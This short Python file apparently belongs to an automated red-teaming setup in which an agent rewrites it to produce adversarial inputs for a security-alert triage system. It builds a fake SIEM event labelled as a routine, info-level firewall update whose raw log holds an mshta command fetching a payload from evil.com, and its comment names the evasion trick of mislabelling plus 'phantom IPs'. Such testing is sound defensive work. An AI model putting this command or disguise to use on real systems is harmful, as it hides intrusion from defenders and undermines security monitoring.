"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 16: mshta http + firewall_update evasion + phantom IPs
    return {
        "task_type": "firewall_update",
        "severity": "info",
        "siem_event": {
            "title": "Firewall Rule Update",
            "source_ip": "10.40.0.5",
            "destination_ip": "10.40.0.6",
            "username": "svc_firewall",
            "hostname": "fw-mgmt-01",
            "rule_name": "FirewallConfig",
            "raw_log": (
                "EventID=4688 Process=mshta.exe "
                "CommandLine=mshta http://evil.com/payload.hta "
                "User=DOMAIN\\admin ParentProcess=explorer.exe "
                "WorkingDirectory=C:\\Users\\admin\\Desktop"
            ),
        },
    }
